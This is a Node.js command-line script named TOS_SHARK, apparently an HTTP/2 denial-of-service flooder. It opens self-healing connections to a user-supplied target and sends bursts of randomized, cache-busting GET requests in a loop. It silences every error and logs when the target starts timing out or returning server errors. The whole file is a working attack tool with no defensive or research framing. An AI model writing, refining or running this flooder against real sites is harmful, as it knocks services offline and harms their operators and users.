const http2 = require('http2');

class TOS_SHARK {
    constructor(target) {
        const url = new URL(target);
        this.host = url.hostname;
        this.target = target;
        this.running = true;
        this.totalReqs = 0;
        this.startTime = Date.now();
        this.lastLog = Date.now();
        this.reqCounter = 0;
        
        // Bulletproof connections
        this.conns = [];
        this.maxConns = 5; // Fewer but more stable
        
        // Print header once
        console.log(`TØS-SHARK | *.* | MT-3M22`);
        console.log('-----------------------------------------------------------------');
        
        this.start();
    }

    color(t, c) {
        const colors = { r: '\x1b[91m', g: '\x1b[92m', y: '\x1b[93m', x: '\x1b[0m' };
        return `${colors[c] || ''}${t}${colors.x}`;
    }

    start() {
        // Setup connections with error handling
        for (let i = 0; i < this.maxConns; i++) {
            this.createConnection(i);
        }
        
        // Start attack
        this.attackLoop();
        
        // Auto-reconnect dead connections
        setInterval(() => {
            this.checkConnections();
        }, 5000);
        
        process.on('SIGINT', () => {
            this.running = false;
            process.exit(0);
        });
    }

    createConnection(id) {
        try {
            const client = http2.connect(this.target, {
                maxSessionMemory: 4096, // Less memory
                maxDeflateDynamicTableSize: 4096
            });
            
            // Set low listeners to prevent memory leaks
            client.setMaxListeners(20);
            
            // Handle ALL possible errors
            client.on('error', (err) => {
                // Silent - will be recreated
                setTimeout(() => {
                    this.createConnection(id);
                }, 1000);
            });
            
            client.on('close', () => {
                setTimeout(() => {
                    this.createConnection(id);
                }, 1000);
            });
            
            client.on('frameError', () => {
                // Silent
            });
            
            client.on('goaway', () => {
                setTimeout(() => {
                    this.createConnection(id);
                }, 2000);
            });
            
            this.conns[id] = client;
            
        } catch (err) {
            // Retry in 2 seconds
            setTimeout(() => {
                this.createConnection(id);
            }, 2000);
        }
    }

    checkConnections() {
        for (let i = 0; i < this.maxConns; i++) {
            if (!this.conns[i] || this.conns[i].destroyed || this.conns[i].closed) {
                this.createConnection(i);
            }
        }
    }

    getRandomPath() {
        const paths = ['/', '/api', '/static', '/data', '/v1', '/v2', '/test', '/ping'];
        return paths[Math.floor(Math.random() * paths.length)];
    }

    getRandomHeaders() {
        return {
            'user-agent': 'Mozilla/5.0',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache'
        };
    }

    async attackLoop() {
        while (this.running) {
            try {
                // Get active connections
                const activeConns = this.conns.filter(c => c && !c.destroyed && !c.closed);
                
                if (activeConns.length === 0) {
                    await this.sleep(100);
                    continue;
                }
                
                // Send 20 requests per tick (safer)
                for (let i = 0; i < 20; i++) {
                    const client = activeConns[Math.floor(Math.random() * activeConns.length)];
                    
                    if (!client) continue;
                    
                    this.sendRequest(client).catch(() => {});
                }
                
                await this.sleep(0.5); // Slightly longer delay
                
            } catch (err) {
                // Catch ANY loop error and continue
                await this.sleep(100);
            }
        }
    }

    async sendRequest(client) {
        return new Promise((resolve) => {
            this.reqCounter++;
            this.totalReqs++;
            
            // Set timeout
            const timeout = setTimeout(() => {
                this.logStatus('TIMEOUT');
                resolve();
            }, 3000);
            
            try {
                const req = client.request({
                    ':method': 'GET',
                    ':path': `${this.getRandomPath()}?t=${Date.now()}`,
                    ':authority': this.host,
                    ...this.getRandomHeaders()
                });
                
                req.on('response', (headers) => {
                    clearTimeout(timeout);
                    const status = headers[':status'];
                    this.logStatus(status);
                    req.destroy(); // IMPORTANT: Destroy stream
                    resolve();
                });
                
                req.on('error', (err) => {
                    clearTimeout(timeout);
                    if (err.code === 'ECONNRESET' || err.code === 'ECONNREFUSED' || 
                        err.code === 'ETIMEDOUT' || err.code === 'EPIPE') {
                        this.logStatus('TIMEOUT');
                    } else {
                        this.logStatus('ERROR');
                    }
                    resolve();
                });
                
                req.on('close', () => {
                    clearTimeout(timeout);
                    resolve();
                });
                
                req.end();
                
            } catch (err) {
                clearTimeout(timeout);
                this.logStatus('ERROR');
                resolve();
            }
        });
    }

    logStatus(status) {
        const now = Date.now();
        if (now - this.lastLog >= 5000) {
            this.lastLog = now;
            
            let color = 'g';
            let text = status;
            
            if (status === 'TIMEOUT') {
                color = 'r';
                text = 'TIMEOUT';
            } else if (typeof status === 'number' && status >= 500) {
                color = 'r';
                text = status;
            } else if (typeof status === 'number' && status >= 400) {
                color = 'y';
                text = status;
            } else if (typeof status === 'number') {
                text = status;
            }
            
            console.log(`STS-HAROP-INT ---> ${this.color(text, color)}:0.1s`);
            
            // Down event - only for TIMEOUT or 5xx
            if ((status === 'TIMEOUT' || (typeof status === 'number' && status >= 500)) && color === 'r') {
                console.log(this.color(`{3M22-${this.reqCounter} --> ${text}}`, 'r'));
            }
        }
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

// Run
if (require.main === module) {
    // Global error handlers
    process.on('uncaughtException', (err) => {
        // Silently ignore all errors
    });
    
    process.on('unhandledRejection', () => {
        // Silently ignore
    });
    
    if (process.argv.length < 3) {
        console.log('Usage: node TOS.js https://target.com');
        process.exit(1);
    }
    
    new TOS_SHARK(process.argv[2]);
}
